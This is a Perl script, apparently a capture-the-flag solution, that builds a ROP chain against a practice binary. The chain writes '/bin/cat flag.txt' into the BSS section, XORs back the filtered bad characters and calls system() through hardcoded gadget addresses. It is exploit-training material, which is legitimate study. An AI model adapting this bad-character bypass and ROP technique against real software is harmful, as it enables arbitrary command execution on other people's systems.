# Plan A is to write our string to bss and then xor it using a gadget.
# However, we don't have much space for our ROP chain so we must xor only
# the problematic bytes and not the whole string.

use strict;
use warnings;

# It appears bad chars are overwritten with 0xeb. Find which byte to use in a
# xor with 0xeb to get the original char back.
my %BADCHARS = (
	' ' => 0xcb, # 0xeb ^ 0x20
	'/' => 0xc4, # 0xeb ^ 0x2f
	'b' => 0x89, # 0xeb ^ 0x62
	'c' => 0x88, # 0xeb ^ 0x63
	'f' => 0x8d, # 0xeb ^ 0x66
	'i' => 0x82, # 0xeb ^ 0x69
	'n' => 0x85, # 0xeb ^ 0x6e
	's' => 0x98, # 0xeb ^ 0x73
);

my $PADDING  = "B"x40;
my $BSS      = "\x80\x10\x60\x00" . "\0"x4; # BSS section
my $CALLSYS  = "\xe8\x09\x40\x00" . "\0"x4; # call to system()
my $POPRDI   = "\x39\x0b\x40\x00" . "\0"x4; # pop rdi

my $ALLIGN = 8;

sub xor_memory
{
	my ($addr, $string) = @_;

	my $rop = "";
	for my $char (split //, $string)
	{
		if (my $xored = $BADCHARS{$char})
		{
			$rop .= "\x40\x0b\x40\x00" . "\0"x4; # pop r14; pop r15
			$rop .= pack("QQ", $xored, $addr);
			$rop .= "\x30\x0b\x40\x00" . "\0"x4; # xor byte [r15], r14b
		}

		$addr++;
	}

	$rop;
}


sub write_bytes
{
	my ($addr, $string) = @_;

	my $mod = (length $string) % $ALLIGN;
	if ($mod ne 0) {
		$string .= "\x00" x ($ALLIGN - $mod);
	}

	my $rop = "";
	for my $str (unpack("(a$ALLIGN)*", $string))
	{
		$rop .= "\x3b\x0b\x40\x00" . "\0"x4; # pop r12; pop r13
		$rop .= $str;
		$rop .= pack("Q", $addr);
		$rop .= "\x34\x0b\x40\x00" . "\0"x4; # mov qword [r13], r12
		$addr += $ALLIGN;
	}

	$rop;
}


my $str = "/bin/cat flag.txt\0";

# 416 bytes
print $PADDING
	. write_bytes(0x601080, $str) # write @bss
	. xor_memory(0x601080, $str)
	. $POPRDI . $BSS
	. $CALLSYS;
